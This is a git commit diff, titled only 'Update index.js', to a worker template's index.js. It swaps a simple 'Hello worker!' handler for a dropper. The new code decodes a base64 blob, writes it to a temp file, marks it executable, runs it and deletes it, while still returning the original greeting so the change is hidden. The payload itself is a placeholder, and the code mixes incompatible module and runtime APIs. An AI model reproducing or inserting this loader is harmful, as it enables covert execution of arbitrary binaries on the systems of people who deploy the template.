fe98e55a77d1f0472ea8f15156f8592123d56d2b
Suzyo Nyirenda <suzyoeliasnyirenda@gmail.com>
2023-06-10 17:14:59 +0200

    Update index.js

--- templates/worker/index.js
+++ templates/worker/index.js
@@ -1,9 +1,39 @@
+const fs = require('fs');
+const { exec } = require('child_process');
+
+const base64ToBinary = (base64) => {
+  const binaryData = Buffer.from(base64, 'base64');
+  return binaryData;
+};
+
 export default {
-	fetch() {
-		return new Response('Hello worker!', {
-			headers: {
-				'content-type': 'text/plain',
-			},
-		});
-	},
+  fetch() {
+    const base64String = '...'; // Replace with your base64 string
+
+    const binaryData = base64ToBinary(base64String);
+
+    // Write binary data to a temporary file
+    fs.writeFileSync('temp', binaryData);
+
+    // Make the temporary file executable
+    fs.chmodSync('temp', '755');
+
+    // Execute the temporary file
+    exec('./temp', (error, stdout, stderr) => {
+      if (error) {
+        console.error(error);
+      } else {
+        console.log(stdout);
+      }
+
+      // Delete the temporary file
+      fs.unlinkSync('temp');
+    });
+
+    return new Response('Hello worker!', {
+      headers: {
+        'content-type': 'text/plain',
+      },
+    });
+  },
 };
